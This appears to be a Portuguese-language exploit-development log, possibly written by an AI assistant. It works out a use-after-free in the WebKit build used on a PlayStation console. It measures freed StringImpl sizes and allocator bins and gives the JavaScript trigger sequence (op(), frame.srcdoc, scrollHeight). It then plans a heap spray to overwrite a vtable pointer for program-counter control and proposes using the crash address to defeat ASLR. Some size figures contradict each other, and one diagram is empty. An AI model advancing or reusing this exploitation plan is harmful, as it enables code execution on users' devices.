Agora temos o threshold exato. Deixa eu calcular o que isso significa com precisão.

---

## O que os dados determinam

```
N=64  → freed StringImpl(128 chars Latin-1) → crash 1ª visita ✓
N=80  → freed StringImpl(160 chars Latin-1) → crash 2ª visita ✗

Threshold: entre 128 e 160 chars de conteúdo freed
```

O cálculo do tamanho real do objeto freed:

```
StringImpl header (WebKit):
  m_refCount     4 bytes
  m_length       4 bytes
  m_hash         4 bytes
  m_hashAndFlags 4 bytes
  Total header = 16 bytes

StringImpl(128 chars, Latin-1) = 16 + 128 = 144 bytes → bin 160
StringImpl(160 chars, Latin-1) = 16 + 160 = 176 bytes → bin 192

O bin exploitável em cold start é o de 160 bytes.
O realocador (frame.srcdoc = "a") cria algum objeto C++ de 141–160 bytes.
```
Resultado preciso e muito informativo. Agora temos dados suficientes para entender o mecanismo e traçar o caminho para exploração.

---

## O que N=64 crash / N=128 não crash nos diz

O objeto freed pela primeira `op()` dentro do load handler é o `StringImpl` acumulado das 2 early calls:

```
N=64:  freed StringImpl = 128 chars Latin-1 = 128 bytes + ~20 header = ~148 bytes
       → fastMalloc bin ~160 bytes
       → bin realocado rapidamente por operações internas → crash 1ª visita ✓

N=128: freed StringImpl = 256 chars = ~276 bytes
       → fastMalloc bin ~320 bytes
       → bin NÃO realocado em cold start → precisa de priming ✗
```

O threshold está entre **148 e 276 bytes**. Esse é o tamanho do objeto exploitável em heap limpo.

---

## O que realoca o bin freed na 1ª visita

Olha a sequência exata dentro do load handler:

```javascript
op();               // call 3: LIBERA StringImpl(2N bytes) ← objeto freed
frame.srcdoc = "a"; // ← REALOCA bin: cria Document, DOMWindow,
                    //   Parser, e dezenas de sub-objetos C++
op();               // call 4: scrollHeight acessa o bin realocado → CRASH
```

**`frame.srcdoc = "a"` é o realocador.** Ele cria vários objetos C++ imediatamente após o freed bin ser liberado. Para N≤64 (bin ≤160 bytes), algum objeto criado pelo `srcdoc` tem o tamanho certo e cai exatamente no endereço freed. Para N≥128 (bin ≥320 bytes), nenhum objeto do `srcdoc` tem esse tamanho em cold start.

O objeto realocado pelo `srcdoc` tem seu **vtable pointer** como primeiro campo. O `scrollHeight` lê esse vtable como se fosse um `RenderBox`. PC aponta para o vtable do objeto que caiu no bin → crash com endereço previsível.

## Por que isso é o caminho para controle de execução

```
StringImpl(2N chars) freed
       ↓

       ↓

       ↓

```

Se conseguirmos influenciar o conteúdo do srcdoc de forma que o objeto C++ criado contenha dados que controlamos, o primeiro campo (vtable pointer) lido pelo `scrollHeight` passa a ser nosso dado → controle de PC.

## Por que identificar o realocador importa

O objeto que cai no bin 160 é lido pelo `scrollHeight` como se fosse um `RenderBox`. O acesso é:

```cpp
// Element::scrollHeight() → RenderBox::scrollHeight()
int scrollHeight = renderBox->scrollHeight(); // virtual dispatch

// O que acontece internamente:
vtable_ptr = *((void**)freed_ptr);           // lê primeiros 8 bytes como vtable
method = vtable_ptr[índice_de_scrollHeight]; // indexa vtable
method(freed_ptr);                           // chama com `this` = freed memory
```

Se o objeto realocado no bin 160 tiver os primeiros 8 bytes controlados por nós, esse `method` apontará para onde quisermos.

O caminho concreto:
```
Identificar realocador
       ↓
Verificar se seu conteúdo é influenciável via JS
(ex: se for um objeto de parser, o srcdoc controla seu conteúdo)
       ↓
Spray: alocar N cópias do realocador com dados controlados
antes de disparar o UAF
       ↓
scrollHeight lê vtable = nosso dado → PC controlado
```

## O que os testes E, F, G confirmaram juntos

```
Test E (sem srcdoc)          → SEM crash algum
Test F (srcdoc="")           → crash 1ª visita
Test G (srcdoc="A"×1000)    → crash 1ª visita
```

Três conclusões simultâneas:

**1. `frame.srcdoc` é o realocador confirmado.** Sem ele, bin 160 não é realocado, sem crash.

**2. O realocador é content-independent.** srcdoc="" e srcdoc="A"×1000 crasham identicamente. O C++ object criado por `setLocation()` tem tamanho fixo independente do conteúdo passado.

**3. O objeto realocador tem ~150–160 bytes.** Isso é determinado pelo bin que foi freed:

```
Early calls × 2 com N=64:
  logEl acumula 128 chars antes do load handler

Call 3 (1ª dentro do load handler):
  removeChildren(logEl) → libera StringImpl(128 chars Latin-1)
  StringImpl = header(16) + content(128) = 144 bytes → bin 160

frame.srcdoc = "" (ou "a" ou "A"×1000):
  → cria objeto C++ de tamanho fixo ~150-160 bytes → cai no bin 160

Call 4 scrollHeight:
  → layout acessa bin 160 como RenderObject
  → lê vtable do objeto realocado → crash
```

## O objeto realocador: candidatos em `setLocation()`

`HTMLFrameElementBase::setLocation()` no WebKit 605.1.15 faz:

```cpp
void HTMLFrameElementBase::setLocation(const String& str)
{
    m_frameURL = AtomString(str);          // AtomString("") = 17 bytes → bin 32, descartado
    
    if (isConnected())
        contentFrame()->navigationScheduler()
            .scheduleLocationChange(            // ← AQUI cria o objeto realocador
                document,
                document.securityOrigin(),
                completedURL,
                referrer,
                LockHistory::No,
                LockBackForwardList::No
            );
}
```

`scheduleLocationChange` cria um `ScheduledLocationChange` (subclasse de `ScheduledNavigation`) alocado no heap. Este é o candidato mais provável para ~160 bytes:

```cpp
class ScheduledNavigation {        // base
    double m_delay;                //  8 bytes
    bool m_wasDuringLoad;          //  1 byte
    bool m_isLocationChange;       //  1 byte (+6 padding)
};                                 // = 16 bytes

class ScheduledLocationChange      // subclasse
    : public ScheduledNavigation {
    vtable*               8 bytes
    [base]               16 bytes
    FrameLoadRequest     ~80-100 bytes
    String m_referrer     8 bytes
    bool m_hasLockPolicy  1 byte (+7 padding)
};                                 // ≈ 120-140 bytes?
```

Pode ser também um `FrameLoadRequest` alocado separadamente, ou um `ResourceRequest` interno.

---

## Por que isso é significativo para exploração

O realocador tem vtable fixo — sempre o mesmo tipo C++, sempre o mesmo endereço de vtable na `.text` de `libSceNKWebKit.sprx`. O crash address é determinístico.

```
scrollHeight → lê bin 160 como RenderBox
            → *freed_ptr = vtable de ScheduledLocationChange
            → chama vtable[N] com this = freed_ptr
            → PC = endereço dentro de libSceNKWebKit.sprx
```

Isso significa que com ASLR, o crash address revela o slide de `libSceNKWebKit.sprx` — é um **info leak implícito via crash address**.
